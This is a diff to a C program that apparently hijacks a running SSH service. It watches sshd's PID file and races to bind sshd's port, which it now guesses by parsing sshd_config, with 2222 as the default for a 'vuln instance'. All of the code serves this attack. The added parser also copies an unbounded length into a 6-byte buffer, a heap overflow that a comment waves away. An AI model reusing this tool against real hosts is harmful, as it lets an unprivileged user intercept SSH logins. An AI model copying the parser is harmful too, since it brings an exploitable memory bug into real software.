@@ -3,6 +3,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <sys/inotify.h>
+#include <string.h>
 #include <unistd.h>
 #include <sys/types.h>
 #include <sys/socket.h>
@@ -12,6 +13,9 @@
 #include <limits.h>
 
 #define PIDFILE "/var/run/sshd.pid"
+#define CONFIGFILE "/etc/ssh/sshd_config"
+
+unsigned int guessPort();
 
 int main(int argc, char ** argv) {
 	struct inotify_event *event;
@@ -25,10 +29,13 @@ int main(int argc, char ** argv) {
 	struct sockaddr_in sock_addr;
 	struct in_addr sin_addr;
 
+	int port = guessPort();
+	printf("We guessed the port: %u\r\n", port);
+
 	// Prepare our socket -- the more we can do now, the less chance we have of a race condition later
 	sock = socket(AF_INET, SOCK_STREAM, 0);
 	sock_addr.sin_family = AF_INET;
-	sock_addr.sin_port = htons(2222); // We should bind to any ports that sshd defines that are >1024 TODO
+	sock_addr.sin_port = htons(port);
 	sin_addr.s_addr = INADDR_ANY;
 	sock_addr.sin_addr = sin_addr;
 
@@ -85,4 +92,40 @@ int main(int argc, char ** argv) {
 	}
 
 	return 0;
+}
+
+unsigned int guessPort() {
+	int port = 0;
+	// Attempt to read out the SSH configuration file and ghetto parse it
+	FILE *fp = fopen(CONFIGFILE, "r");
+	if (fp != NULL) {
+		// At least we can read the file...
+		// Parse it line by line looking for "Port"
+		char * line = NULL;
+		size_t len = 0;
+		ssize_t read = 0;
+		while ((read = getline(&line, &len, fp)) != -1) {
+			if (strncasecmp("Port ", line, 5) == 0) {
+				// Matching line found!
+				char * sport = calloc(6, sizeof(char)); // 6 bytes is probably enough. Fuck anyone messing with us above that
+				strncpy(sport, line + 5, read - 6); // We don't need to copy the newline or null byte, and we start from after the Port
+				// Convert it to an integer and check if it's > 1024
+				int portguess = atoi(sport);
+				free(sport);
+				if (portguess > 1024) {
+					port = portguess;
+				}
+			}
+		}
+		free(line);
+		fclose(fp);
+	}
+
+	// TODO: Is there another method we could use here where we check the listening TCP sockets of the currently running SSH process?
+
+	// If all other attempts fail, 2222 is a reasonable 'default' for a vuln instance
+	if (port < 1) {
+		port = 2222;
+	}
+	return port;
 }
